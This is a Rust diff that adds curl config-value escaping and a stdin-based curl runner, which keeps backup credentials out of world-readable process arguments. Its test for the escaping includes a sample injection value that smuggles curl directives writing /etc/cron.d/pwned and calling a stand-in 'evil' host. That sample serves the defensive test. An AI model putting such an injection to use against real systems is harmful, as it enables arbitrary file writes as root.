@@ -221,6 +221,134 @@ mod tests {
 /// Ordered by how completely each cause explains the failure: a
 /// read-only or full filesystem makes every later symptom meaningless,
 /// so it is matched first.
+/// Escape a value for a curl config-file directive.
+///
+/// curl reads `name = "value"` and honours backslash escapes inside the
+/// quotes. Without escaping, a password containing a quote ends the value
+/// early and the rest of it is parsed as MORE DIRECTIVES — a newline plus
+/// `output = "/etc/cron.d/x"` in a backup password is a file write as root.
+/// The value is attacker-influenced wherever an operator pastes a credential
+/// from somewhere else, so it is escaped rather than trusted.
+pub fn curl_config_quote(value: &str) -> String {
+    let mut out = String::with_capacity(value.len() + 2);
+    for c in value.chars() {
+        match c {
+            '\\' => out.push_str("\\\\"),
+            '"' => out.push_str("\\\""),
+            '\n' => out.push_str("\\n"),
+            '\r' => out.push_str("\\r"),
+            '\t' => out.push_str("\\t"),
+            other => out.push(other),
+        }
+    }
+    out
+}
+
+/// Run curl with its options on STDIN instead of argv.
+///
+/// `/proc/<pid>/cmdline` is world-readable, so any local user — on this
+/// product that means any tenant with shell, FTP or PHP on the node — can
+/// read another process's arguments. A credential there is a credential
+/// published to every tenant for as long as the process lives, and an upload
+/// of a multi-hundred-megabyte backup lives for minutes. Nothing about the
+/// argument being "short-lived" helps: reading /proc in a loop is trivial.
+///
+/// `config` is a curl config file: one `name = "value"` per line. Build every
+/// interpolated value with [`curl_config_quote`].
+pub async fn curl_with_config(config: &str) -> Result<String, AdapterError> {
+    let (stdout, stderr, code) = curl_with_config_capture(config).await?;
+    if code != 0 {
+        return Err(AdapterError::Command {
+            // NOT the config: it holds the credential this whole function
+            // exists to keep out of places people can read.
+            cmd: "curl --config - (options withheld)".to_string(),
+            code,
+            stderr_tail: stderr,
+        });
+    }
+    Ok(stdout)
+}
+
+/// [`curl_with_config`] without treating a non-zero exit as an error.
+///
+/// Some probes read curl's own report (`-w "%{http_code}"`) and need the
+/// output of a run that curl considers a failure — an FTP 530 is the ANSWER
+/// there, not a transport problem. Returns `(stdout, stderr tail, exit code)`.
+pub async fn curl_with_config_capture(config: &str) -> Result<(String, String, i32), AdapterError> {
+    use tokio::io::AsyncWriteExt;
+    debug!("exec curl (options on stdin)");
+    let mut child = Command::new("/usr/bin/curl")
+        .arg("--config")
+        .arg("-")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()
+        .map_err(|e| AdapterError::Other(format!("spawn curl: {e}")))?;
+    if let Some(mut si) = child.stdin.take() {
+        si.write_all(config.as_bytes())
+            .await
+            .map_err(|e| AdapterError::Other(format!("write curl config: {e}")))?;
+        si.shutdown()
+            .await
+            .map_err(|e| AdapterError::Other(format!("close curl stdin: {e}")))?;
+    }
+    let out = child
+        .wait_with_output()
+        .await
+        .map_err(|e| AdapterError::Other(format!("wait curl: {e}")))?;
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    let tail: String = stderr
+        .chars()
+        .rev()
+        .take(4096)
+        .collect::<String>()
+        .chars()
+        .rev()
+        .collect();
+    Ok((
+        String::from_utf8_lossy(&out.stdout).into_owned(),
+        tail,
+        out.status.code().unwrap_or(-1),
+    ))
+}
+
+#[cfg(test)]
+mod curl_config_tests {
+    use super::curl_config_quote;
+
+    /// An ordinary credential passes through untouched.
+    #[test]
+    fn a_plain_value_is_unchanged() {
+        assert_eq!(curl_config_quote("s3cr3t-p4ss"), "s3cr3t-p4ss");
+        assert_eq!(curl_config_quote("user@example.cz"), "user@example.cz");
+    }
+
+    /// The injection this exists to stop: a quote would close the value and
+    /// everything after it would be read as further curl directives.
+    #[test]
+    fn a_quote_cannot_end_the_value() {
+        let evil = "pw\"\noutput = \"/etc/cron.d/pwned\"\nurl = \"http://evil\"";
+        let quoted = curl_config_quote(evil);
+        assert!(!quoted.contains('\n'), "a raw newline survived: {quoted}");
+        // Every quote in the output is preceded by a backslash.
+        for (i, c) in quoted.char_indices() {
+            if c == '"' {
+                assert!(
+                    i > 0 && quoted.as_bytes()[i - 1] == b'\\',
+                    "an unescaped quote survived: {quoted}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn a_backslash_is_doubled_so_it_cannot_escape_the_closing_quote() {
+        assert_eq!(curl_config_quote("a\\"), "a\\\\");
+        assert_eq!(curl_config_quote("a\\\"b"), "a\\\\\\\"b");
+    }
+}
+
 pub fn explain_apt_failure(output: &str) -> Option<&'static str> {
     // Case-insensitive on purpose — dpkg and apt disagree about capitals
     // across versions and locales.
